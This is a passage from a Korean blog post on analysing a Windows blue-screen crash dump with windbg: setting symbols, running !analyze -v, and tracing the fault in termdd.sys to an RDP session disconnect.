operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>\n  <span class=\"token operator\">**</span>예외 문자열<span class=\"token operator\">**</span>   SYSTEM_SERVICE_EXCEPTION   <span class=\"token operator\">**</span>예외 코드<span class=\"token operator\">**</span>   <span class=\"token number\">0x0000003b</span>\n  <span class=\"token operator\">**</span>파라미터<span class=\"token operator\">**</span>      <span class=\"token number\">00000000</span><span class=\"token operator\">-</span>c0000005                          \n                    <span class=\"token operator\">**</span>fffff880<span class=\"token operator\">-</span>011c9722<span class=\"token operator\">**</span>                      \n                    fffff880<span class=\"token operator\">-</span>0cad81f0                          </code></pre></div>\n<p><strong>2. BSOD 메모리 덤프 파일 분석 환경</strong></p>\n<p>windbg를 통해 분석하기 위해 그림 4‑1장에서 구성한 대상 서버에서 발생한\n메모리 덤프를 분석하고 자하는 로컬 환경으로 가져온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABrklEQVQozz2S227iMBCGQwJ71d5CEkhsYjt2guNjAjkhWikt2qUr+v5P041B+1/NzK9vZqQZb+iOURTGcfz6+rJYLHzfD4JguVz6vv9Il6vVnLpqEATB6tfD9X3f06YZx9HaWkrJigIA8Pb+Pk0TIUQpNV3053WilP25fvy+fmKM28t0atss2ydJ4glRMcaMNlLKsiwZY1UlKl6VZVmJSkphjCaYMErHc6uUsse2rmvGGITQi+Ot0YXWFcaEUooxxghxzouiyHOS57QsSxfnVVXt9/s4jtM03e128+QMYQCSMNwghIyxlFJCCEIIAAAglFIe+CHLMs55TgiEMM/zpwuAx49jjtF6vRZC3O/f5/Hc9Z0x2rmwaZq6ro2TtSZNEsqY1tp1ht6p63e7bRhGQsqvv1/DMHTdE4YAWjuTWmuH6xmmVCn5hN8uA0I4DEMh5O126/v+1LZKysdkW9fWWm0crB3MqFbqCXetwTiPoohzfr9/933f9X1t7f+1m6YxxtSuS5Ik82mMecLtkUfRdrPZFEUxDIOYNd/MufBwOHDOGStKJ5CmGOPCvcM/+Ae/pVzwqjfQdgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image45\"\n        title=\"image45\"\n        src=\"/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png\"\n        srcset=\"/static/47770b923dc6d6375b473138999651c5/e9ff0/image45.png 180w,\n/static/47770b923dc6d6375b473138999651c5/f21e7/image45.png 360w,\n/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. windbg 심볼 설정</strong></p>\n<p>메모리 덤프파일이 빌드 될 때 생성되는 디버깅 정보파일을 불러오기 위해\n해당 심볼을 설정한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.777777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAkElEQVQI143JQQ7CIBQEUBIXBmiwi1KaYMU0paL9YNpjmOr9bzMGjK5dvMxkhil1gFIVdDfiuj4RlgduGS24JwJFAlFESgkxxtI/6Gees7lg4+gx+QH9sML4Fzq/4Rg22NOEcDnDuR7WWjjnYIxB0zTQWhe5t21b9px1XYMJIcC5gBR7VHwH+SV42fP/Lykl3pevTthqhC52AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image46\"\n        title=\"image46\"\n        src=\"/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png\"\n        srcset=\"/static/782b49255a296da15c591e7685f3e0e6/e9ff0/image46.png 180w,\n/static/782b49255a296da15c591e7685f3e0e6/f21e7/image46.png 360w,\n/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span>\\\\windbg<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>y srv\\<span class=\"token operator\">*</span>c<span class=\"token operator\">:</span>\\\\symbols\\<span class=\"token operator\">*</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//msdl.microsoft.com/download/symbols</span>\n     <span class=\"token operator\">-</span>z D<span class=\"token operator\">:</span>\\\\STUDY\\\\PenTest_Study\\\\Project\\\\Day4_5\\\\report\\\\bluescreen_dmp\\\\<span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01.</span>dmp</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>옵션<span class=\"token operator\">**</span>          <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>y SymbolPath<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 경로 지정 및 다중 경로는 세미콜론 구분 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>z DumFile<span class=\"token operator\">**</span>    <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   메모리 덤프 파일 이름 지정                  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>srv\\<span class=\"token operator\">**</span><span class=\"token operator\">*</span>         <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 캐쉬 저장할 경로와 심볼 파일이         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     존재하는 경로 <span class=\"token punctuation\">(</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> asterisk<span class=\"token punctuation\">)</span> 구분자를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     구분한다<span class=\"token punctuation\">.</span>                                   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p>심볼 설정을 로드 한 후 지정한 심볼 캐시가 저장될 경로에는 메모리 덤프를\n진행한후 심볼 캐시가 남아있는 모습을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA+klEQVQY02WQ206EMBBA+QMTH8TFdtophYJsYGhBCMZ4CRtXwOgm/v+36LIXXfe8Ts6cyXjL/ivsJmCMMQ4AQgiYQVRCSMaYlJJzLoSQUsIp3tXlRSjg4d5VjpQKESXOEJVEZIzJ8zxNU0TUWuMpXhAEkck2792wfjEmFQLkTEFU13VBZJ1z1nHO5RneYnGto+Rj6KZxlWVLgL1srW2aO6KyqipXbWVE/C/fBEEU336O3Tj0SZKC+JXbtqGStrKby+cyY0yF8WZq316foyjePeZQbqicy87uzj5O97Lv+6jCYf246p+01sdxQdtmURREZK0FAKXU3+0/8jeJ20A8P+JL7AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image47\"\n        title=\"image47\"\n        src=\"/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png\"\n        srcset=\"/static/c891bde5d422a33711af6f5d4767433b/e9ff0/image47.png 180w,\n/static/c891bde5d422a33711af6f5d4767433b/f21e7/image47.png 360w,\n/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. windbg 메모리 덤프 로딩</strong></p>\n<p>심볼 설정을 마치고 windbg에서는 심볼을 다운로드가 완료된 후 !analyze -v\n명령을 통해 메모리 덤프 파일의 상세 정보를 출력한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABxElEQVQoz52OXXOaQBSG+f+3bWdsjEZNUNs/4LSxNqZaG60iIyoIgvIlwWWBXQQMH9uxrdOmk6s+8168F+c551Cd/vBuwHQH4+lsMZ5y4ynHzBbz5UoQZUFSVmtFXG9W61ORlO1GNTaqsdUMfq1+n8ypjaq7rsdy81and9t9aLW/tj71P/fHt/ejj91R+37U7k0+dB86vWFvyA4m3DeG+zJiZdVMs5ziFgvoAElWx3OJE1WWV9ilzInqbLVl+Y2sA8V0FOMU2QCyfoqo2o4XEEKo+ZLXNE1VNQfsPRf6LnSA7UIAwd6DToD8YxSmyTFNjlnyRPKMnMmynDLMXYCxZux4XoDQ8X2EEAIA2LZtPT4ijBFCvo/CMAyCw+EQ5j/5LYdRTAjRjR3DMIIgiGckSTJNEwAAIYzjOD/z7HIYHQkh9h7wgmDoumVZAADP81zXxRhHUZQkyd/OMzmKT7LjeoZhWpbl+36aZdkLwy/Jv95GOHA9D2McYHyIYhyl6WnHv+T5n54kKfWUpOR/oS5L5UajSdcbtWu6VCqXS5Vr+t0N/f7yql4sVq6q1XLlplarFkpVulFvNpvFcvXV6zeFtxeFi+IP3x5QsAtkagIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image48\"\n        title=\"image48\"\n        src=\"/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png\"\n        srcset=\"/static/51ede3fb1e4257f0bb7e07559516e64b/e9ff0/image48.png 180w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/f21e7/image48.png 360w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABYUlEQVQoz5WQyU7DMBCG8/5PgjiUskmgQoEDEgTKIaKiUCe2U5fISRxn8UaxG0QEQgr7p/8wntEnj8YL5w+z6fRuOr0NghAAGIYhCMEcRCCCEYQIwyjCMFwuYpanvXgb+2ebB+eDw4vB6HIwutw7nWyPr4bH/vD4eudkMhxPto78rdHF/tnN7sl1Lx6KCcQk53VeVI80o1lR1pJXoqzlaypRC/1k12blzHM/nrPWaK2VYnnOi6IqudbKKKW7ppJCStl+gwcAQAhhjGiaVlXVNHXZwTl3zrU/4gVB4Pv+bDa7f7hPkmQRY4zRIo4xQmmaZlkqpTTGSCmttX05SR4hQpzzRjSr1cp0PHVorc07SqnPi3iiaeqqdm7d/h+PsyJLs7IsjTFt2647Xifrtivenm/NnlwwRiklhJAloZQuCRFCdO4ffmZ5hiCMoogx5pyz1v565A+55DzuTpwz9uVuP8gv1yukqhh4pXoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image49\"\n        title=\"image49\"\n        src=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png\"\n        srcset=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/e9ff0/image49.png 180w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/f21e7/image49.png 360w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>5. 예외 발생 위치 분석</strong></p>\n<p>메모리 덤프 파일에서 볼 수 있듯이 termdd!IcaBufferAllocEx. 함수에서\n오류가 발생한다. 해당주소의 명령어는 fxffff880-0x11c9722에서 포인터를\n읽으려고 시도한다. 다음 명령어는 포인터가 qword 가리키는 점을 참조하여\n그 값을 0과 비교한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABaElEQVQoz32SCYqDQBBFvf/RAoGQReMajLhmG7t6cYn+oZokM8nAFDyqFXz8rtJxXRfMZrPBbrdDWZZo2xZd10EIAa01pJQwxoBrnuc//LwHHJZ5ngff921nCQvqukaaprYPw4D/6inlcljERFFkE7KA07D4crngdru9Uk7T9MZnQiuM49jKDoeDFT+FzOl0ss8sZpRSD7mC0QrSDFD99DYKZ7/fW1EYhjZhVVUgIktRFGiaxp61UriPI8YH9/uIYZww3Od3oR8EYOIkget5OGYZlNaWqq6RFwVaISCUAvU9SMrHnAlCD5DdR8IkCMAckwSB66LKcxgiqLZFU5Zo8hzUthDHI/RmCyMltDHojIHuRpiBhfOvKy8W2C+XiFYr229ZhvF6ha5rFL6PdLtF6rooVivQeg3F6XiWSkKYEdTPbxt3gihCGMfg7ochDmmK5ny2H30J8YJ48/xvEtkrE4+BJAQpu6wn30y6q3uLqd4+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image50\"\n        title=\"image50\"\n        src=\"/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png\"\n        srcset=\"/static/27ef0e40a41a7acc083a70a47b79484d/e9ff0/image50.png 180w,\n/static/27ef0e40a41a7acc083a70a47b79484d/f21e7/image50.png 360w,\n/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>6. 호출 스택 분석</strong></p>\n<p>호출 스택 부분을 보면 termdd.sys 파일 내부에 IcaBufferAllocEx 함수가\nRDPWD.sys 드라이버에서 호출되며 NM_Disconnect 함수가 다시 호출되어\n세션이 끊어짐과 동시에 오류가 발생하는 것을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABiklEQVQoz6VS7Y6bMBDk/d/qQgIGG9sQCBdFUXtcuAQE5ivJqSF4KvtO/d92pJV3Zq3xSh7n9P6uLpcL6rrWj8cDBlprLMtiy/R/U85HWaq6rtE0je66DrfbDf+MZYFzOB7bn29vaJTSbdehH0aM04RuGNAPgz2HacIwfenDOFrter9jul4tN/r4+YkFgEPdVS8Dgi1jmq5d7ITAPkkQrFZgnofQdcEJAfnm3PetlksJ4fvgngfJGH68rLCEFI7wvF4SgpiGmm3W9uJOCmtgjLjvIQ4C0M0anPgQQYDQXf0xjAlBxjn6osCvqoLDOG9lLCGTWEdmu8MB2yxDyBiSNAWXwszAOAeXEjSK4AUE+X6PbLcDFwLxdouyqnCfZzhRxJSUwgw0pRR5/oo0TRGYrSgFIQQR5/AJAWVffON5yPMcWZZBcI44TnA8Hm0qnKIoVFVV+Dif9ak84Xy+oG1bKNWhVQpKKXRdbzWTAsNNbz9oGGwq5nmGiZyNTVmWqmkadErp5/NpX/kf/AZ6xpXaFkhXrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image51\"\n        title=\"image51\"\n        src=\"/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png\"\n        srcset=\"/static/9783993b41126d7246854b96881c1a44/e9ff0/image51.png 180w,\n/static/9783993b41126d7246854b96881c1a44/f21e7/image51.png 